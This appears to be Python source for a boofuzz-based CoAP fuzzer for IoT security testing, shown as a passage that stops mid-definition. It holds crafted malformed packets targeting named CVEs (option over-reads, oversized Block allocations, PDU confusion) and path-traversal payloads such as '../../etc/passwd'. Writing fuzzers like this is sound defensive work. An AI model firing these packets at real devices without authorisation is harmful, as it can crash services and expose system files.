"""CoAP Protocol Fuzzer

Optimized for breadth-first coverage and early crash detection.

Test Ordering Strategy (5 Phases):
    Phase 1 (0-30s): Quick_Coverage - All methods (GET/POST/PUT/DELETE/FETCH/PATCH/IPATCH)
                     and message types (CON/NON/ACK/RST) in single sweep
    Phase 2 (30s-2m): High-crash tests - Malformed packets, overflow attacks, invalid options
    Phase 3 (2m-5m): CVE-targeted - Option parsing attacks, integer overflows, PDU exploits
    Phase 4 (5m-10m): Boundary attacks - Token length, option delta/length, message IDs
    Phase 5 (10m+): Deep fuzzing - Standard requests with full mutation

CVE Coverage:
    - CVE-2024-0962: Stack buffer overflow in option parsing (Phase 2)
    - CVE-2024-31031: Unsigned integer overflow in PDU handling (Phase 2)
    - CVE-2025-50518: Use-after-free in PDU deletion (Phase 3)
    - DDoS Amplification: Large response triggering via .well-known/core (Phase 1)
"""

from typing import List, Optional

from boofuzz import Byte, DWord, Group, Request, Static, Word
from oida.fuzz.core.connections import CountingUDPConnection as UDPSocketConnection

from oida.fuzz.core.base_fuzzer import BaseFuzzer, RequestInfo
from oida.fuzz.core.config import FuzzerConfig, ProtocolType
from oida.fuzz.monitors import BaseMonitor
from oida.fuzz.primitives.dynamic import SmartString


def coap_header_byte(version: int = 1, msg_type: int = 0, token_length: int = 0) -> int:
    """Build CoAP header byte from version, type, and token length.

    CoAP header first byte format:
    - Bits 7-6: Version (2 bits, must be 1)
    - Bits 5-4: Type (2 bits: 0=CON, 1=NON, 2=ACK, 3=RST)
    - Bits 3-0: Token Length (4 bits, 0-8)

    Returns: packed byte value
    """
    return ((version & 0x03) << 6) | ((msg_type & 0x03) << 4) | (token_length & 0x0F)


class CoAPFuzzer(BaseFuzzer):
    """CoAP Protocol Fuzzer for IoT device security testing

    CoAP is a simple web transfer protocol for constrained nodes/networks.
    Similar to HTTP but designed for IoT devices with limited resources.

    Optimized test ordering ensures:
    - All 7 methods and 4 message types tested within first 30 seconds
    - High-crash tests (malformed, overflow) run in first 2 minutes
    - CVE-relevant operations tested within first 5 minutes
    - Boundary attacks complete within first 10 minutes
    """

    # CoAP Message Types
    CON = 0  # Confirmable
    NON = 1  # Non-confirmable
    ACK = 2  # Acknowledgement
    RST = 3  # Reset

    # CoAP Method Codes
    EMPTY = 0x00
    GET = 0x01
    POST = 0x02
    PUT = 0x03
    DELETE = 0x04
    FETCH = 0x05  # RFC 8132
    PATCH = 0x06  # RFC 8132
    IPATCH = 0x07  # RFC 8132

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Get static request definitions for --list-requests"""
        return [
            # Phase 1: Quick Coverage
            RequestInfo("CoAP_Quick_Coverage", "All methods/types sweep", "quick_coverage"),
            # Phase 2: High-crash
            RequestInfo("CoAP_High_Crash_Malformed", "Malformed packet tests", "high_crash"),
            RequestInfo("CoAP_Overflow_Payload", "Payload overflow attacks", "high_crash"),
            RequestInfo("CoAP_Option_Overflow", "Option overflow attacks", "high_crash"),
            RequestInfo("CoAP_Integer_Overflow", "Integer overflow in PDU", "high_crash"),
            # Phase 3: CVE-targeted
            RequestInfo("CoAP_PDU_Attacks", "PDU parsing attacks", "cve"),
            RequestInfo("CoAP_Path_Traversal", "Path traversal attempts", "cve"),
            RequestInfo(
                "CoAP_OSCORE_Option_Malformed",
                "OSCORE option (No.9) flag byte claims Partial-IV/kid-context/kid "
                "lengths larger than the value present (CVE-2024-0962 OOB write)",
                "cve",
            ),
            RequestInfo(
                "CoAP_Block_Forged",
                "Block1/Block2 (No.27/23) forged SZX + huge NUM + M-bit implying "
                "oversized total, plus non-1-3-byte block value (CVE-2026-58465 alloc)",
                "boundary",
            ),
            # Phase 4: Boundary attacks
            RequestInfo("CoAP_Token_Boundary", "Token length boundary", "boundary"),
            RequestInfo("CoAP_Header_Boundary", "Header field boundaries", "boundary"),
            RequestInfo("CoAP_Code_Boundary", "Code field boundaries", "boundary"),
            RequestInfo("CoAP_Option_Boundary", "Option delta/length boundaries", "boundary"),
            # Phase 5: Standard requests
            RequestInfo("CoAP_GET", "Standard GET requests", "standard"),
            RequestInfo("CoAP_POST", "Standard POST requests", "standard"),
            RequestInfo("CoAP_PUT", "Standard PUT requests", "standard"),
            RequestInfo("CoAP_DELETE", "Standard DELETE requests", "standard"),
            RequestInfo("CoAP_Observe", "Observe subscription", "standard"),
            RequestInfo("CoAP_Block_Transfer", "Block-wise transfer", "standard"),
            RequestInfo("CoAP_Content_Format", "Content format options", "standard"),
            RequestInfo("CoAP_Conditional", "Conditional requests", "standard"),
            RequestInfo("CoAP_ETag", "ETag handling", "standard"),
            RequestInfo("CoAP_Cache_Control", "Max-Age and cache control", "standard"),
        ]

    def __init__(self, config: FuzzerConfig = None, connection_factory=None):
        if config:
            config.protocol_type = ProtocolType.UDP
        super().__init__(config, connection_factory)

    # Reply-expectation policy (same pattern as MQTT): RFC 7252 requires a
    # server to answer a CON message with ACK (or RST), so CON sends wait for
    # a reply; NON (fire-and-forget) and our own ACK/RST frames get none.
    # Nearly every CoAP request here is CON, but the Header_Boundary group
    # walks all four type values and mutated header bytes can flip the type
    # -- the policy classifies whatever bytes actually go on the wire.
    # Non-CoAP-looking bytes (empty/short) conservatively wait.
    @classmethod
    def _reply_expected_for_payload(cls, data: bytes) -> bool:
        if not data:
            return True
        first = data[0]
        version = (first >> 6) & 0x3
        msg_type = (first >> 4) & 0x3
        if version != 1:
            return True  # Unparseable as CoAP: assume it might get an answer
        return msg_type in (cls.CON,)

    reply_policy = _reply_expected_for_payload

    # Cap on the reply-expected wait. Real ACKs to parseable CONs arrive in
    # single-digit ms against the docker mock; silence past ~0.15s means the
    # server dropped the malformed request. Without the cap, each dropped
    # CON burns the full recv timeout (~2s default, ~0.5s calibrated),
    # capping the whole run at a few cases/second. Same rationale/value as
    # MQTT's cap; calibration can still tighten it via the derived-cap path
    # when it would go lower.
    reply_wait_cap = 0.15

    def _create_socket(self):
        """Create UDP socket for CoAP with proper bind and timeout for receiving responses.

        CoAP is a UDP-based protocol that requires:
        - bind: To bind to a local port for receiving responses
        - recv_timeout: To wait for ACK/response from server
        """
        return UDPSocketConnection(
            self.config.target_ip,
            self.config.target_port,
            bind=("0.0.0.0", 0),  # Bind to any interface, ephemeral port
            **self._timeout_overrides(recv_default=2.0),  # Wait up to 2 seconds for CoAP response
        )

    def _build_uri_path_option(self, path: str, prev_option: int = 0) -> bytes:
        """Build CoAP Uri-Path option(s) for a given path.

        Uri-Path is Option 11. CoAP option deltas are RELATIVE to the previous
        option number, so when Uri-Path follows another option (e.g. Observe=6
        or If-Match=1) the first segment's delta is 11 - prev_option, not 11.
        Passing the wrong delta shifts every following option number and tshark
        rejects the packet as malformed.

        Option format: (delta << 4 | length) followed by value
        - First segment: delta = 11 - prev_option
        - Subsequent segments: delta = 0 (same option number)
        """
        segments = [s for s in path.split("/") if s]  # Remove empty segments
        if not segments:
            return b""

        first_delta = 11 - prev_option
        result = b""
        for i, segment in enumerate(segments):
            seg_bytes = segment.encode("utf-8")
            seg_len = len(seg_bytes)
            delta = first_delta if i == 0 else 0

            if seg_len < 13:
                result += bytes([(delta << 4) | seg_len]) + seg_bytes
            elif seg_len < 269:
                result += bytes([(delta << 4) | 0x0D, seg_len - 13]) + seg_bytes
            else:
                result += (
                    bytes([(delta << 4) | 0x0E]) + (seg_len - 269).to_bytes(2, "big") + seg_bytes
                )

        return result

    def _define_protocol(self):
        """Define CoAP protocol messages for fuzzing

        Test order optimized for breadth-first coverage and early crash detection:
        - Phase 1: Quick_Coverage (all methods/types in ~30s)
        - Phase 2: High-crash tests (malformed, overflow)
        - Phase 3: CVE-targeted (option parsing, integer overflow)
        - Phase 4: Boundary attacks (all field boundaries)
        - Phase 5: Deep fuzzing (standard requests with mutations)
        """

        # ============================================================
        # PHASE 1: QUICK COVERAGE (~30 seconds)
        # Touch all methods and message types in single sweep
        # ============================================================

        # Quick_Coverage: All 7 methods + 4 message types in one request
        # This ensures we hit every major code path within first 30 seconds
        quick_coverage = Request(
            "CoAP_Quick_Coverage",
            children=(
                Group(
                    name="quick_sweep",
                    values=[
                        # All 4 message types with GET
                        b"\x40\x01\x00\x01" + self._build_uri_path_option("test"),  # CON GET
                        b"\x50\x01\x00\x02" + self._build_uri_path_option("test"),  # NON GET
                        b"\x60\x00\x00\x03",  # ACK EMPTY
                        b"\x70\x00\x00\x04",  # RST EMPTY
                        # All 7 methods (CON type)
                        b"\x40\x01\x00\x10" + self._build_uri_path_option("test"),  # GET
                        b"\x44\x02\x00\x11\xab\xcd\xef\x01"
                        + self._build_uri_path_option("test")
                        + b"\xfftest",  # POST
                        b"\x42\x03\x00\x12\xab\xcd"
                        + self._build_uri_path_option("test")
                        + b"\xffdata",  # PUT
                        b"\x40\x04\x00\x13" + self._build_uri_path_option("test"),  # DELETE
                        b"\x44\x05\x00\x14\xde\xad\xbe\xef"
                        + self._build_uri_path_option("test")
                        + b"\xffquery",  # FETCH
                        b"\x42\x06\x00\x15\x12\x34"
                        + self._build_uri_path_option("test")
                        + b"\xff{}",  # PATCH
                        b"\x42\x07\x00\x16\x56\x78"
                        + self._build_uri_path_option("test")
                        + b"\xff{}",  # IPATCH
                        # Discovery (DDoS amplification vector)
                        b"\x40\x01\x00\x20" + self._build_uri_path_option(".well-known/core"),
                        # Observe subscribe/unsubscribe
                        b"\x44\x01\x00\x30\xde\xad\xbe\xef\x60"
                        + self._build_uri_path_option("sensor"),  # Observe=0
                        b"\x44\x01\x00\x31\xde\xad\xbe\xef\x61\x01"
                        + self._build_uri_path_option("sensor"),  # Observe=1
                        # Block-wise transfer (Block1 and Block2)
                        b"\x42\x01\x00\x40\x11\x22"
                        + self._build_uri_path_option("large")
                        + b"\xc1\x02",  # Block2
                        b"\x42\x02\x00\x41\x33\x44"
                        + self._build_uri_path_option("upload")
                        + b"\xd1\x05\x0a\xffdata",  # Block1
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Quick_Coverage"):
            self.session.connect(quick_coverage)

        # ============================================================
        # PHASE 2: HIGH-CRASH TESTS (30s - 2m)
        # Malformed packets, buffer overflows, invalid parsing
        # CVE-2024-0962: Stack buffer overflow in option parsing
        # CVE-2024-31031: Unsigned integer overflow in PDU
        # ============================================================

        # Critical malformed messages - most likely to crash
        high_crash_malformed = Request(
            "CoAP_High_Crash_Malformed",
            children=(
                Group(
                    name="crash_vectors",
                    values=[
                        # Token length overflow (TKL > 8, causes buffer overflow)
                        b"\x4f\x01\x12\x34" + b"\xff" * 15,  # TKL=15
                        b"\x4e\x01\x12\x34" + b"\xaa" * 14,  # TKL=14
                        b"\x4d\x01\x12\x34" + b"\xbb" * 13,  # TKL=13
                        b"\x4c\x01\x12\x34" + b"\xcc" * 12,  # TKL=12
                        b"\x4b\x01\x12\x34" + b"\xdd" * 11,  # TKL=11
                        b"\x4a\x01\x12\x34" + b"\xee" * 10,  # TKL=10
                        b"\x49\x01\x12\x34" + b"\xff" * 9,  # TKL=9
                        # Invalid version (triggers undefined behavior)
                        b"\xc0\x01\x12\x34",  # Ver=3
                        b"\x80\x01\x12\x34",  # Ver=2
                        b"\x00\x01\x12\x34",  # Ver=0
                        # Reserved option delta/length (15 = error)
                        b"\x40\x01\x12\x34\xf0",  # Delta=15 (reserved)
                        b"\x40\x01\x12\x34\x0f",  # Length=15 (reserved)
                        b"\x40\x01\x12\x34\xff",  # Both=15 (payload marker abuse)
                        b"\x40\x01\x12\x34\xfd\x00",  # Delta=15, extended length
                        # Option length overflow (integer overflow in PDU parsing)
                        b"\x40\x01\x12\x34\xdd\xff\xff\xff\xff",  # Extended delta/len max
                        b"\x40\x01\x12\x34\xde\xff\xff\xff\xff\xff\xff",  # 2-byte extended max
                        b"\x40\x01\x12\x34\xed\xff\xff\xff\xff",  # Extended with large len
                        b"\x40\x01\x12\x34\xee\xff\xff\xff\xff\xff\xff",  # Both 2-byte max
                        # Truncated packets (crash on read beyond buffer)
                        b"",  # Empty
                        b"\x40",  # Just header byte
                        b"\x40\x01",  # Header + code
                        b"\x40\x01\x12",  # Missing message ID byte
                        b"\x40\x01\x12\x34\x0b",  # Truncated option
                        # Multiple payload markers
                        b"\x40\x02\x12\x34\xff\xff\xff",
                        b"\x40\x02\x12\x34\xffpayload\xff\xff",
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_High_Crash_Malformed"):
            self.session.connect(high_crash_malformed)

        # Buffer overflow via large payloads
        overflow_payload = Request(
            "CoAP_Overflow_Payload",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 4), fuzzable=True),
                Byte(name="code", default_value=self.POST, fuzzable=True),
                Word(name="message_id", default_value=0x2000, endian=">"),
                DWord(name="token", default_value=0xDEADBEEF, endian=">"),
                Static(name="uri_path", default_value=self._build_uri_path_option("overflow")),
                Static(name="payload_marker", default_value=b"\xff"),
                SmartString("large_payload", "A" * 1024, max_len=65535),  # Max UDP payload
            ),
        )
        if self.is_request_enabled("CoAP_Overflow_Payload"):
            self.session.connect(overflow_payload)

        # Option parsing overflow (CVE-2024-0962 style)
        option_overflow = Request(
            "CoAP_Option_Overflow",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 0), fuzzable=True),
                Byte(name="code", default_value=self.GET, fuzzable=True),
                Word(name="message_id", default_value=0x2001, endian=">"),
                # Craft options with overflow-inducing lengths
                Group(
                    name="overflow_options",
                    values=[
                        # Uri-Path with maximum extended length
                        b"\xbd\xff" + b"A" * 268,  # delta=11, len=255+13=268
                        b"\xbe\xff\xff" + b"B" * 65803,  # delta=11, len=65535+269 (wrapped)
                        # Multiple options chained to overflow accumulator
                        (b"\xb1A" * 100),  # 100 Uri-Path options with 1-byte paths
                        # Option with delta causing integer wrap
                        b"\xdd\xff\x00" + b"C" * 13,  # delta=255+13, triggers wrap check
                        # OSCORE option (CVE-2024-0962 target)
                        b"\x91\x09" + b"\x00" * 9,  # Option 9 (observe) with data
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Option_Overflow"):
            self.session.connect(option_overflow)

        # ============================================================
        # PHASE 3: CVE-TARGETED OPERATIONS (2m - 5m)
        # Specific patterns known to trigger vulnerabilities
        # ============================================================

        # Integer overflow in message ID and option handling
        integer_overflow = Request(
            "CoAP_Integer_Overflow",
            children=(
                Group(
                    name="int_overflow",
                    values=[
                        # Message ID boundaries
                        b"\x40\x01\x00\x00" + self._build_uri_path_option("test"),  # Min MID
                        b"\x40\x01\xff\xff" + self._build_uri_path_option("test"),  # Max MID
                        b"\x40\x01\x7f\xff" + self._build_uri_path_option("test"),  # Sign boundary
                        b"\x40\x01\x80\x00" + self._build_uri_path_option("test"),  # Sign flip
                        # Option delta accumulation overflow
                        b"\x40\x01\x12\x34" + b"\xd0\xf2" * 50,  # Many delta=255 options
                        # Content-Format with large values
                        b"\x42\x02\x12\x34\xab\xcd"
                        + self._build_uri_path_option("data")
                        + b"\x12\xff\xff"
                        + b"\xffpayload",  # Content-Format=65535
                        # Max-Age overflow
                        b"\x40\x01\x12\x34"
                        + self._build_uri_path_option("cache")
                        + b"\x34\xff\xff\xff\xff",  # Max-Age=4294967295
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Integer_Overflow"):
            self.session.connect(integer_overflow)

        # PDU handling attacks (CVE-2025-50518 use-after-free patterns)
        pdu_attacks = Request(
            "CoAP_PDU_Attacks",
            children=(
                Group(
                    name="pdu_vectors",
                    values=[
                        # Response codes sent as requests (confuses PDU type)
                        b"\x40\x41\x12\x34",  # 2.01 Created
                        b"\x40\x44\x12\x34",  # 2.04 Changed
                        b"\x40\x45\x12\x34",  # 2.05 Content
                        b"\x40\x80\x12\x34",  # 4.00 Bad Request
                        b"\x40\x84\x12\x34",  # 4.04 Not Found
                        b"\x40\xa0\x12\x34",  # 5.00 Internal Server Error
                        b"\x40\xff\x12\x34",  # Invalid code 255
                        # Invalid code class
                        b"\x40\x08\x12\x34",  # Class 0, code 8 (undefined)
                        b"\x40\x60\x12\x34",  # Class 3 (undefined)
                        b"\x40\xc0\x12\x34",  # Class 6 (undefined)
                        b"\x40\xe0\x12\x34",  # Class 7 (undefined)
                        # Piggybacked response pattern (may confuse state)
                        b"\x60\x45\x12\x34"
                        + self._build_uri_path_option("test"),  # ACK with Content
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_PDU_Attacks"):
            self.session.connect(pdu_attacks)

        # Path traversal attacks
        path_traversal = Request(
            "CoAP_Path_Traversal",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 0), fuzzable=True),
                Byte(name="code", default_value=self.GET, fuzzable=True),
                Word(name="message_id", default_value=0x3001, endian=">"),
                Group(
                    name="traversal_paths",
                    values=[
                        self._build_uri_path_option(".."),
                        self._build_uri_path_option("../.."),
                        self._build_uri_path_option("../../etc/passwd"),
                        self._build_uri_path_option("."),
                        self._build_uri_path_option("./config"),
                        self._build_uri_path_option("test/../../../secret"),
                        self._build_uri_path_option("%2e%2e"),
                        self._build_uri_path_option("%2e%2e/%2e%2e"),
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Path_Traversal"):
            self.session.connect(path_traversal)

        # OSCORE option (No. 9) value fuzzing (CVE-2024-0962 libcoap OSCORE OOB).
        # The OSCORE option value begins with a flag byte:
        #   bits 0-2 (n) = Partial-IV length, bit 3 (k) = kid present,
        #   bit 4 (h) = kid-context present, bits 5-7 reserved.
        # A flag byte that claims a Partial-IV / kid-context / kid longer than the
        # bytes actually in the option value drives the parser to read past it.
        # Option 9 with no prior option -> delta nibble = 9 (0x9_).
        oscore_option_malformed = Request(
            "CoAP_OSCORE_Option_Malformed",
            children=(
                Group(
                    name="oscore_flag_vectors",
                    values=[
                        # flag 0x1f (n=7,k=1,h=1) in a 1-byte value: claims 7-byte
                        # Partial-IV + kid-context + kid, none present -> over-read.
                        b"\x40\x01\x00\x09\x91\x1f",
                        # flag 0x10 (h=1 kid-context) + ctx-len 0xff but 0 ctx bytes.
                        b"\x40\x01\x00\x09\x92\x10\xff",
                        # flag 0x05 (Partial-IV len 5) in a 1-byte value.
                        b"\x40\x01\x00\x09\x91\x05",
                        # flag 0x08 (k=1 kid) claims a kid past the value end.
                        b"\x40\x01\x00\x09\x91\x08",
                        # OSCORE option with extended length lying (13+0xf0=253
                        # declared, 1 value byte present) on top of a n=7 flag.
                        b"\x40\x01\x00\x09\x9d\xf0\x1f",
                        # Max flag 0xff (all reserved bits + n=7,k,h) -> reserved-bit
                        # + length over-read combined.
                        b"\x40\x01\x00\x09\x91\xff",
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_OSCORE_Option_Malformed"):
            self.session.connect(oscore_option_malformed)

        # Block1/Block2 forged size-exponent + huge block-number (CVE-2026-58465
        # Wakaama Block1 unbounded allocation). A Block option value encodes
        # NUM (block number) in the upper bits, then M (more) at bit 3 and SZX
        # (size exponent 0-7, block size = 2^(SZX+4)) in bits 0-2. A max NUM with
        # M=1 and SZX=7 (1024-byte blocks) implies a total far larger than any
        # datagram delivered, so a server that pre-allocates NUM*blocksize
        # over-allocates. The CoAP Block value must be 1-3 bytes; a 4-byte value
        # is itself malformed. Block1 (27) / Block2 (23) follow Uri-Path (11), so
        # their deltas are 16 (ext 13+3 -> 0xd_) and 12 (0xc_) respectively.
        block_forged = Request(
            "CoAP_Block_Forged",
            children=(
                Group(
                    name="block_forged_vectors",
                    values=[
                        # Block1 (27) forged: 3-byte value 0xffffff -> NUM=0xfffff,
                        # M=1, SZX=7 -> oversized declared total (unbounded alloc).
                        b"\x40\x03\x00\x40"
                        + self._build_uri_path_option("upload")
                        + b"\xd3\x03\xff\xff\xff",
                        # Block1 (27) with a 4-byte value -> Block option length is
                        # not the legal 1-3 bytes (malformed).
                        b"\x40\x03\x00\x41"
                        + self._build_uri_path_option("upload")
                        + b"\xd4\x03\xff\xff\xff\xff",
                        # Block2 (23) forged: 3-byte value 0xffffff, huge NUM+SZX=7.
                        b"\x40\x01\x00\x42"
                        + self._build_uri_path_option("large")
                        + b"\xc3\xff\xff\xff",
                        # Block1 (27) SZX=7 + M=1 with a mid-range NUM (0x1f6).
                        b"\x40\x03\x00\x43"
                        + self._build_uri_path_option("upload")
                        + b"\xd2\x03\x1f\x6f",
                        # Block2 (23) SZX=0 (16-byte blocks) but M=1 + max NUM ->
                        # enormous block count.
                        b"\x40\x01\x00\x44"
                        + self._build_uri_path_option("large")
                        + b"\xc3\xff\xff\xf8",
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Block_Forged"):
            self.session.connect(block_forged)

        # ============================================================
        # PHASE 4: BOUNDARY ATTACKS (5m - 10m)
        # Systematic boundary value testing
        # ============================================================

        # Token length boundary testing
        token_boundary = Request(
            "CoAP_Token_Boundary",
            children=(
                Group(
                    name="token_lengths",
                    values=[
                        b"\x40\x01\x12\x34",  # TKL=0
                        b"\x41\x01\x12\x34\xaa",  # TKL=1
                        b"\x42\x01\x12\x34\xaa\xbb",  # TKL=2
                        b"\x44\x01\x12\x34\xaa\xbb\xcc\xdd",  # TKL=4
                        b"\x48\x01\x12\x34" + b"\xaa" * 8,  # TKL=8 (max valid)
                        # Boundary just above max
                        b"\x49\x01\x12\x34" + b"\xbb" * 9,  # TKL=9 (invalid)
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Token_Boundary"):
            self.session.connect(token_boundary)

        # Header byte boundary (all combinations of Ver/Type/TKL)
        header_boundary = Request(
            "CoAP_Header_Boundary",
            children=(
                Group(
                    name="header_combos",
                    values=[
                        # Version boundaries
                        bytes([0x00 | (self.CON << 4) | 0]) + b"\x01\x12\x34",  # Ver=0
                        bytes([0x40 | (self.CON << 4) | 0]) + b"\x01\x12\x34",  # Ver=1 (valid)
                        bytes([0x80 | (self.CON << 4) | 0]) + b"\x01\x12\x34",  # Ver=2
                        bytes([0xC0 | (self.CON << 4) | 0]) + b"\x01\x12\x34",  # Ver=3
                        # Type boundaries with Ver=1
                        bytes([0x40 | (0 << 4) | 0]) + b"\x01\x12\x34",  # Type=CON
                        bytes([0x40 | (1 << 4) | 0]) + b"\x01\x12\x34",  # Type=NON
                        bytes([0x40 | (2 << 4) | 0]) + b"\x00\x12\x34",  # Type=ACK
                        bytes([0x40 | (3 << 4) | 0]) + b"\x00\x12\x34",  # Type=RST
                        # All TKL values 0-15 with Ver=1, Type=CON
                        bytes([0x40]) + b"\x01\x12\x34",  # TKL=0
                        bytes([0x41]) + b"\x01\x12\x34\xaa",  # TKL=1
                        bytes([0x42]) + b"\x01\x12\x34\xaa\xbb",  # TKL=2
                        bytes([0x43]) + b"\x01\x12\x34" + b"\xaa" * 3,  # TKL=3
                        bytes([0x44]) + b"\x01\x12\x34" + b"\xaa" * 4,  # TKL=4
                        bytes([0x45]) + b"\x01\x12\x34" + b"\xaa" * 5,  # TKL=5
                        bytes([0x46]) + b"\x01\x12\x34" + b"\xaa" * 6,  # TKL=6
                        bytes([0x47]) + b"\x01\x12\x34" + b"\xaa" * 7,  # TKL=7
                        bytes([0x48]) + b"\x01\x12\x34" + b"\xaa" * 8,  # TKL=8 (max valid)
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Header_Boundary"):
            self.session.connect(header_boundary)

        # Code boundary testing (all valid and invalid codes)
        code_boundary = Request(
            "CoAP_Code_Boundary",
            children=(
                Group(
                    name="code_values",
                    values=[
                        # Class 0 (methods)
                        b"\x40\x00\x12\x34",  # EMPTY
                        b"\x40\x01\x12\x34",  # GET
                        b"\x40\x02\x12\x34",  # POST
                        b"\x40\x03\x12\x34",  # PUT
                        b"\x40\x04\x12\x34",  # DELETE
                        b"\x40\x05\x12\x34",  # FETCH
                        b"\x40\x06\x12\x34",  # PATCH
                        b"\x40\x07\x12\x34",  # IPATCH
                        b"\x40\x1f\x12\x34",  # Max detail in class 0
                        # Class boundaries
                        b"\x40\x20\x12\x34",  # Class 1 start
                        b"\x40\x3f\x12\x34",  # Class 1 end
                        b"\x40\x40\x12\x34",  # Class 2 start (success)
                        b"\x40\x5f\x12\x34",  # Class 2 end
                        b"\x40\x80\x12\x34",  # Class 4 start (client error)
                        b"\x40\x9f\x12\x34",  # Class 4 end
                        b"\x40\xa0\x12\x34",  # Class 5 start (server error)
                        b"\x40\xbf\x12\x34",  # Class 5 end
                        b"\x40\xe0\x12\x34",  # Class 7 (signaling for TCP)
                        b"\x40\xff\x12\x34",  # Maximum code value
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Code_Boundary"):
            self.session.connect(code_boundary)

        # Option delta/length boundary testing
        option_boundary = Request(
            "CoAP_Option_Boundary",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 0), fuzzable=True),
                Byte(name="code", default_value=self.GET, fuzzable=True),
                Word(name="message_id", default_value=0x4001, endian=">"),
                Group(
                    name="option_boundaries",
                    values=[
                        # Delta boundaries (0-14 inline, 13 = +1 byte, 14 = +2 bytes)
                        b"\x01A",  # delta=0, len=1 (If-Match)
                        b"\xc1A",  # delta=12, len=1
                        b"\xd0\x00",  # delta=13+0=13, len=0
                        b"\xd0\xff",  # delta=13+255=268, len=0
                        b"\xe0\x00\x00",  # delta=14+0+269=269, len=0
                        b"\xe0\xff\xff",  # delta=14+65535+269=65818, len=0
                        # Length boundaries
                        b"\xb0",  # delta=11, len=0 (Uri-Path empty)
                        b"\xbcA" * 12,  # delta=11, len=12
                        b"\xbd\x00A" * 13,  # delta=11, len=13+0=13
                        b"\xbd\xff" + b"A" * 268,  # delta=11, len=13+255=268
                        b"\xbe\x00\x00" + b"A" * 269,  # delta=11, len=14+0+269=269
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Option_Boundary"):
            self.session.connect(option_boundary)

        # ============================================================
        # PHASE 5: DEEP FUZZING (10m+)
        # Standard requests with full mutation for thorough coverage
        # ============================================================

        # Standard GET with mutations
        coap_get = Request(
            "CoAP_GET",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 0), fuzzable=True),
                Byte(name="code", default_value=self.GET, fuzzable=True),
                Word(name="message_id", default_value=0x5000, endian=">"),
                Static(name="uri_path", default_value=self._build_uri_path_option("temperature")),
            ),
        )
        if self.is_request_enabled("CoAP_GET"):
            self.session.connect(coap_get)

        # Standard POST with payload mutations
        coap_post = Request(
            "CoAP_POST",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 4), fuzzable=True),
                Byte(name="code", default_value=self.POST, fuzzable=True),
                Word(name="message_id", default_value=0x5001, endian=">"),
                DWord(name="token", default_value=0x12345678, endian=">"),
                Static(name="uri_path", default_value=self._build_uri_path_option("echo")),
                Static(name="payload_marker", default_value=b"\xff"),
                SmartString("payload", "test_payload", max_len=1024),
            ),
        )
        if self.is_request_enabled("CoAP_POST"):
            self.session.connect(coap_post)

        # Standard PUT
        coap_put = Request(
            "CoAP_PUT",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 2), fuzzable=True),
                Byte(name="code", default_value=self.PUT, fuzzable=True),
                Word(name="message_id", default_value=0x5002, endian=">"),
                Word(name="token", default_value=0xABCD, endian=">"),
                Static(name="uri_path", default_value=self._build_uri_path_option("temperature")),
                Static(name="payload_marker", default_value=b"\xff"),
                SmartString("temperature", "25.5", max_len=256),
            ),
        )
        if self.is_request_enabled("CoAP_PUT"):
            self.session.connect(coap_put)

        # Standard DELETE
        coap_delete = Request(
            "CoAP_DELETE",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 0), fuzzable=True),
                Byte(name="code", default_value=self.DELETE, fuzzable=True),
                Word(name="message_id", default_value=0x5003, endian=">"),
                Static(name="uri_path", default_value=self._build_uri_path_option("temperature")),
            ),
        )
        if self.is_request_enabled("CoAP_DELETE"):
            self.session.connect(coap_delete)

        # Observe subscription
        coap_observe = Request(
            "CoAP_Observe",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 4), fuzzable=True),
                Byte(name="code", default_value=self.GET, fuzzable=True),
                Word(name="message_id", default_value=0x5004, endian=">"),
                DWord(name="token", default_value=0xDEADBEEF, endian=">"),
                Static(name="observe_opt", default_value=b"\x60"),
                Static(
                    name="uri_path",
                    # Uri-Path follows Observe (option 6), so delta = 11 - 6
                    default_value=self._build_uri_path_option("sensors/temperature", prev_option=6),
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Observe"):
            self.session.connect(coap_observe)

        # Block-wise transfer
        coap_block = Request(
            "CoAP_Block_Transfer",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 2), fuzzable=True),
                Byte(name="code", default_value=self.POST, fuzzable=True),
                Word(name="message_id", default_value=0x5005, endian=">"),
                Word(name="token", default_value=0x3344, endian=">"),
                Static(name="uri_path", default_value=self._build_uri_path_option("upload")),
                # Block1 (option 27) after Uri-Path (11): delta 16 = ext(13)+3
                Static(name="block1_opt", default_value=b"\xd1\x03\x0a"),
                Static(name="payload_marker", default_value=b"\xff"),
                SmartString("block_payload", "A" * 64, max_len=1024),
            ),
        )
        if self.is_request_enabled("CoAP_Block_Transfer"):
            self.session.connect(coap_block)

        # Content-Format option testing
        coap_content_format = Request(
            "CoAP_Content_Format",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 2), fuzzable=True),
                Byte(name="code", default_value=self.POST, fuzzable=True),
                Word(name="message_id", default_value=0x5006, endian=">"),
                Word(name="token", default_value=0x5566, endian=">"),
                Static(name="uri_path", default_value=self._build_uri_path_option("data")),
                Group(
                    name="content_format",
                    values=[
                        b"\x11\x00",  # text/plain (0)
                        b"\x11\x28",  # application/json (40)
                        b"\x11\x32",  # application/cbor (50)
                        b"\x12\x00\x2a",  # application/xml (42)
                        b"\x12\xff\xff",  # Invalid content format
                    ],
